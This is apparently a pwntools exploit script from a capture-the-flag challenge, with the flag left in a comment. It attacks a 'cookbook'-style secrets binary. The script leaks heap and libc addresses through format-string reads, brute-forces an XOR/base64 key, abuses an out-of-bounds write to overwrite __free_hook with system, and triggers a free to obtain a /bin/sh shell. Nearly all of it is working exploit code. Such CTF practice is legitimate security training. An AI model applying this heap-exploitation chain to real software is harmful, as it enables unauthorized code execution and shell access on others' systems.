#!/home/gym/.venvs/ctf/bin/python2
import os
import sys
from pwn import *
c = None
m = None

KEY = ''
def brute_key():

    global KEY
    text = "\x01" * 7
    dump = reads(0, '#3.64')[1:].split('\n')[0]
    while len(dump) < 6:
        ## Guess the number of correctly decoded b64 chars
        ## from the number of outputs
        length = len(dump)
        if length == 0:
            last_gd = 0
        elif length == 3:
            last_gd = 4
        elif length == 6:
            last_gd = 8
        else:
            last_gd = length + 1 + length/3

        print str(length) +" : "+ str(last_gd)
        next_byte = 0x01
        while length == len(dump):
            text = text[0:last_gd] + chr(next_byte) + chr(next_byte)
            text = text + '\x01'*(7-len(text))
            edit(0, 0, len(text), text+'\n')
            dump = reads(0, '#3.64')[1:].split('\n')[0]
            next_byte += 1


    key = b64e(dump)
    key = ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(key[0:7],text[0:7]))
    #key = key[0:-1] + chr((ord(key[-1]) + 3) &0xff)
    print hexdump(key)
    KEY = key+"\x00"

def xcode(payload, base=0):
    res = ''
    for i, c in enumerate(payload):
        res += chr(ord(c) ^ ord(KEY[(base+i)%8]))
    return res

def main():
    ### FLAG{t4v1s_4ssum3d_1t_in_2k14}
    l = m.load_libc()

    ### Initial alloc for leak and other stuff
    add(100, "\x01"*10 + "\n", "T\n")

    # Leak Heap base with format string 'o'
    heap = reads(0, 'llo')[1:].split('B')[0]
    heap_base = int(heap, 8) - 0x1020
    print hex(heap_base)

    ### Brute force the hidden key (b64 decode)
    brute_key()

    ### Fastbin size allocate for the future secret
    edit(0,0, 37, "A"*36 + "\n")
    # Trigger fastbin alloc
    reads(0, '#3.64')

    ### Add victim chunk which size is going to be overflown
    add(200, 'A'*199+'\n','asdf\n') #victim
    ### Add the smallbin chunk (previously groomed)
    # Gonna be used for the overflow
    add(0, 'B'*16+'\xff'*32+'\n', 'CCCC\n') # overflow

    ### Trigger the unsortedbin chunk on the heap (after first secret before 3rd and 2nd)
    reads(0, '#3.64')
    reads(1, '#3.64')

    ### Fill First secret and the space between it and the unsorted chunks BK pointer
    edit(0,0, 99, "A"*99 + "\n")
    # use the unlimited write-what-where to fill the empty space
    edit(1, 0xffffffffffffffff-127, 24, 'A'*24+'\n')

    # read back the first secret, and the libc address with it
    libc = reads(0).split('\n')[-3][-6:].ljust(8, '\x00')
    print hexdump(libc)
    libc = u64(libc)

    # Useful addresses
    libc_base = libc - 0x3c4b78
    free_hook = libc_base + l.symbols['__free_hook']
    system = libc_base + l.symbols['system']
    print hex(libc_base)

    ### Restore Heap
    # Restore a valid size for the unsorted bin
    # so later the malloc would not crash
    edit(1, 0xffffffffffffffff-127, 24, xcode(p64(0x21), 0xffffffffffffffff-127)*3+'\n')

    ### Inject /bin/sh
    # inject the base64 encoded and "encrypted" string
    # to the first secret's data
    pl = b64e("/bin/sh\0")
    print pl
    pl = xcode(pl+"\x00")
    edit(0,0, len(pl), pl + "\n")

    ### Overwrite __free_hook with systems address
    buffer_base = heap_base + 0x1118
    print "buffer: " + hex(buffer_base)
    offset =  free_hook - buffer_base
    print "offset: " + hex(offset)
    print "free_hook: " + hex(free_hook)
    print "system: " + hex(system)
    # encrypt it so it would be decrypted correctly
    sys_addr = xcode(p64(system), offset)
    edit(1, offset, len(sys_addr), sys_addr+'\n')

    ### Trigger the free hook (the buffer will contain the b64decoded /bin/sh)
    reads(0, '#3.64', True)

    c.interactive()

# options: local/remote libc, aslr, debugger, target (vm, native, remote)
# break points: _init+

def add(size, data, subject=None):
    c.sendlineafter('>', str(1))
    c.sendlineafter('>', str(size))
    if subject is None:
        c.sendlineafter('>', 'n')
    else:
        c.sendlineafter('>', 'y')
        c.sendafter('>', subject)
    c.sendafter('>', data)

def edit(sec, offset, size, data):
    c.sendlineafter('>', '2')
    c.sendlineafter('>', str(sec))
    c.sendlineafter('>', str(offset))
    c.sendlineafter('>', str(size))
    c.sendafter('>', data)

def reads(sec, fmt = None, final = False):
    c.sendlineafter('>', '3')
    c.sendlineafter('>', str(sec))
    if fmt is None:
        c.sendlineafter('>', '')
    else:
        c.sendlineafter('>', fmt)
    if final:
        c.interactive()
    return c.recvuntil('===')

gdbs=[#'set sysroot /home/gym/ctf/vagrant/xenial64/sysroot',
    # 'disable 1',
    'c',
    'c',
    # 'c',
    # 'enable 1',
    'c',
    'break *0x000055555555518F',
    'c',
    'c',
    'c'

        ]
bp =[
       # 0x0000555555554DA3
       #0x0000555555554C17
       #0x0000555555554E10, #malloc in read
       0x0000555555554F71 # malloc in add
        ]
if __name__ == "__main__":
    sys.path.append(os.path.expanduser('~/ctf/magicpwn'))
    try:
        from magicpwn import Magic
        # target: vm/native/remote
        # libc: vm/native/remote
        # config: path to config file
        # debug: gdb/villoc/gdbv/none
        m = Magic('vm', 'gdb', aslr=False, libc='local')
        #m = Magic('native', 'none', aslr=False, libc='remote')
        #m = Magic('native', 'villoc', aslr=False, libc='local')
        #m = Magic('remote', 'none', libc='remote')
        c = m.start(cmds=gdbs, bp=bp, ida=False)
    except ImportError:
        c = process("./test/cookb/cookbook")

    main()
